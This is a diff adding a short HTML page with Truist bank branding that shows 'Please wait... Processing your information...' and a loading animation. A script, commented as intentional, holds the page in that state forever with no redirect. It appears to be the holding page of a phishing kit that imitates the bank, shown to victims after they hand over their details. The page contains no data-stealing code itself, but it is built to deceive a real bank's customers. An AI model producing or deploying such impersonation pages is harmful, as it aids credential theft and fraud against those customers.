@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please wait...</title>
+    <link rel="stylesheet" href="res/css/card.css">
+</head> 
+<body>
+<header>
+    <img src="res/img/logos.png" alt="logo">
+</header>
+<main>
+    
+<div class="title">
+Please wait...
+</div>
+
+    <div class="container"> 
+    <div class="text">Processing your information...</div>
+    <img src="res/img/loading.gif" style="width:60px;" alt="loading">
+    </div>
+
+</main>
+<footer>
+© 2024, Truist. All Rights Reserved.
+</footer>
+
+<script>
+// Infinite loading — no timeout, no redirect, do nothing forever
+// The page simply stays in this wait state indefinitely.
+(function loopForever() {
+    // Intentionally empty — the loading.gif loops on its own,
+    // and this script keeps the page in a permanent waiting state.
+    requestAnimationFrame(loopForever);
+})();
+</script>   
+</body>
+</html>
